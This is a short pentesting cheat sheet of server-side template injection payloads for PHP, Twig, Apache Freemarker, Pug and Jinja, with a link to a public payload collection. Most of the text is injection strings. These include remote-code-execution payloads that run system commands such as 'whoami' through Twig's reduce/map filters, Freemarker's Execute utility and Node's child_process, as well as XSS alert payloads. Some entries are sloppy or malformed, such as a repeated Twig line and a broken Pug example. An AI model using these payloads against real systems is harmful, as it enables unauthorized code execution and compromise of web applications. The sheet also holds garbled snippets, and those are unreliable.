# PHP
Note: PHP does not differentiate between an integer number and string number (EG: '5' and 5) - this can be useful for identifying the underlying system.
`{{5*'5'}}`
`{{"test1"}}`

# Twig
Display a string
`{{teststring}}`

Trim whitespace from string
`{{-teststring-}}`

Loop through an array
```
{% for x in ARRAY %}
	Value:{{x}}
{%endfor%}
```

Can cause an error
`{{5*'a'}}`

Can introduce XSS
`{{<script>alert(0)</script>}}`

Example using the twig reduce function to return a system function:
`{{[0]|reduce('system','whoami')}}`

Examples of functions which can read the file system
`{{[0]|reduce('system','whoami')}}`
`{{a|map('exec', 'whoami')}}`

Filters like filter, join, map, reduce, slice, and sort might allow for additional processing

# Apache Freemarker
Note: Apache Freemarker is unable to identify string numbers as integers, EG: `${'5'*5*}` would error.

Show variable
`${teststring}`

Iterate through array
```
<#list testarray as x>
   ${x?index+1}: ${x}
</#list>
```

Introduce XSS
`${'<script>alert(0)</script>'}`

RCE
`${"freemarker.template.utility.Execute"?new()("whoami")}`

# Pug (previously Jade)

Dynamically builds html with supplied variables
`h1 #{teststring}`
will show the teststring in the header html tags

User input fields can be added with:
`input(name='teststring' value='1')`

RCE:
`var require = global.process.mainModule.require= require('child_process').spawnSync('whoami').stdout`

`var require = global.process.mainModule.require= require('child_process').spawnSync('ls', ['-l']).stdout`

# Jinja
Display variables
`{{teststring}}`

Perform middleware code
`{% for x in y %}`

Additional SSTI payloads
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#freemarker---code-execution